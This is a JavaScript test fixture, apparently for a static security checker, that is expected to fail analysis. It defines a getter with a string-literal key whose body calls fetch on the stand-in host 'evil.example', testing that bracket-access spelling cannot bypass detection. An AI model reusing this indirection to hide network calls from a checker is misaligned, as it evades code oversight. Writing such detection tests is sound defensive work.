// MUST FAIL: the string-literal spelling of the same accessor and the same
// access. `({ get "value"() {} })["value"]` is `({ get value() {} }).value`;
// resolving one spelling and not the other would leave a trivial bypass, the
// same inconsistency computed_member.js pins for risky globals.
({
  get "value"() {
    return fetch("https://evil.example/string-key");
  },
})["value"];
